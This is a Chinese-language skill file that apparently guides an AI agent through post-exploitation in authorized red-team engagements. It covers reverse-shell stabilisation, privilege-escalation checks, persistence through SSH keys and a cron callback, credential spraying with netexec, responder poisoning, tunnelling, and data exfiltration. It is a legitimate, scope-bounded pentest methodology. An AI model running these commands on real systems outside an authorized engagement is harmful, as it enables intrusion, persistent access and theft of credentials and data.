---
name: redteam-ops
description: 在授权红队/渗透测试中做「后渗透与作战推进」时调用——从拿到首个访问点到权限保持、凭据获取、横向移动、数据获取的全杀伤链操作方法论。当 worker 拿到 shell/凭据/立足点、规划者要派「后渗透/横向/数据获取」类意图、或需要维持访问与回传数据时使用。
tags:
  attack: [T1078, T1059, T1053, T1003, T1021, T1046, T1005, T1041, T1505]
  class: [post-exploit, persistence, lateral-movement, credential-access, exfiltration, c2, privesc, collection]
---

# Red Team Ops（后渗透与作战推进方法论）

在**已授权**前提下，把「一个漏洞」推进成「一次完整的红队行动」：从初始访问
到权限保持、凭据获取、横向移动、数据获取与回传。漏洞验证用 `vuln-hunting`
skill；本 skill 管的是**拿到访问点之后**的全部作战动作。

**平台能力衔接**：回连接收器用 `listener_start`（C2 出口配置见系统设置，
direct/ssh 中转/manual 三种网络形态）；交互式 shell 用 Bash 的 `nc`/`socat`；
Windows 横向用 `impacket`/`netexec`/`evil-winrm`；隧道用 `chisel`/`ligolo-ng`/
`sshuttle`；流量证据全程被 MITM 代理与探索图留痕。

## 阶段 0：落地与稳定化（Initial Foothold）

拿到第一个 shell 第一件事是**稳住它**，不是急着翻文件。

1. **升级到全交互 TTY**（Linux 反弹 shell）：
   `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Ctrl-Z` → `stty raw -echo; fg`
2. **确认身份与环境**：`id` / `hostname` / `uname -a` / `ip a`——你在谁的机器上、
   什么权限、几块网卡（内网段线索）。
3. **留证据**：把关键输出写进工作目录并 `record_fact`——后渗透的每一步都要
   可复现（红队报告的核心是证据链，不是结论）。
4. **先起监听再触发回连**：做任何会触发目标外连的动作（OOB 盲注、下载载荷）
   之前，用 `listener_start` 把接收器架好。

## 阶段 1：权限提升（Privilege Escalation）

按**性价比顺序**查，不要一上来就全量枚举：

1. **sudo 配置**：`sudo -l`（NOPASSWD 的 GTFOBins 查
   https://gtfobins.github.io ）
2. **SUID/SGID**：`find / -perm -4000 -type f 2>/dev/null`（对照 GTFOBins）
3. **定时任务**：`cat /etc/crontab; ls -la /etc/cron*`（可写脚本=提权+持久双用）
4. **明文凭据**：配置文件/历史文件——`grep -riE "pass(wd|word)?\s*=" /opt /srv /var/www 2>/dev/null | head`
5. **内核/服务漏洞**：`uname -r` 对漏洞情报（`search_vulns`），CVE 命中先找
   公开 PoC（`get_poc`）再手写。
6. 全量枚举用 `linpeas`（hostenv 一键安装），输出太长时抓重点段。

**证据要求**：提权成功必须留下 `id` 前后对比——这是「证明影响」的最小单元。

## 阶段 2：权限保持（Persistence）

**只做任务书授权的动作**。每做一步都要 `record_fact` 留痕（报告里要列清单，
客户要能逐条清除）：

1. **SSH 公钥**（Linux 最干净）：`echo "<授权公钥>" >> ~/.ssh/authorized_keys`
2. **定时任务**：`(crontab -l; echo "*/15 * * * * <callback>") | crontab -`
3. **systemd 服务**：可写目录里的 service 单元（配合 `pspy` 找已有钩子）
4. **Web shell**（web 落地时）：确认上传目录可写、可解析——一句一句话马
   也要测功能边界。
5. **凭据类保持**：改不了密码就记下 hash/凭据（`impacket-secretsdump` 的
   输出本身就是持久化资产）。

**红线**：不碰目标数据完整性、不留破坏性后门、不做 DoS 类保持。所有保持
手段写入 findings 供客户清除。

## 阶段 3：凭据获取（Credential Access）

按来源分四路，每路独立验证：

1. **文件面**：配置文件、.env、.git-credentials、history、保存的浏览器凭据
2. **内存面**（Linux）：`/proc/<pid>/environ`、gcore（有 gdb 时）
3. **网络面**：responder 毒化（内网）、明文协议嗅探（tcpdump + 端口过滤）
4. **复用面**：拿到的每个凭据**立即横向试一轮**（`netexec` 批量喷洒
   `netexec smb <网段> -u user -p pass --continue-on-success`）——凭据复用
   是内网渗透的第一生产力。

## 阶段 4：横向移动（Lateral Movement）

1. **先画内网图**：网卡段 → `netexec smb <cidr>` 或 nmap 快扫 → 存活与端口
2. **协议优先级**：WinRM（evil-winrm，凭据在手时最稳）> SMB（psexec 类）>
   SSH（密钥/密码）> 其他服务默认凭据
3. **隧道进深水区**：不可路由网段用 `chisel`/`ligolo-ng`（代理/路由级二选一，
   ligolo 体验更好）；`proxychains4` 让任意工具走隧道。
4. **每次落地重复阶段 0-3**——横向到新主机=新的阶段 0。

## 阶段 5：数据获取与回传（Collection & Exfiltration）

1. **定位数据**：目标是什么（数据库/文档/代码/配置）？`find` 按扩展名+关键词
   定位，`du -sh` 确认体量——**先看清楚再搬**。
2. **打包与分段**：`tar czf` + 分卷（`split -b 5m`）——大文件是回传失败第一因。
3. **回传通道**（按隐蔽性与可靠性选）：
   - 直接 HTTP POST 到本平台（MITM 代理全留痕，报告可引用）
   - 经 C2 出口（listener 的端口/中转）
   - 加密通道：`socat OPENSSL-LISTEN`（有证书要求时）
4. **完整性证据**：回传后 `sha256sum` 对比——报告里「拿到了什么」要可验证。

## 阶段 6：收尾（清理与报告）

1. 保持项清单（阶段 2 的每一项）→ findings，标注「清除方法」
2. 凭据清单 → findings（脱敏敏感字段，报告另发）
3. 数据获取清单 → findings（文件+sha256）
4. `listener_stop` 收监听器，带走全部会话快照

## 证据纪律（贯穿全程）

- **每个动作前想「怎么证明」**：命令输出截图级留存，不依赖记忆
- **每个凭据/入口立即 record_fact**（探索图会血缘化——报告自动串成链）
- **不确定授权范围时停下问人**——红队的专业性一半在技术、一半在边界感
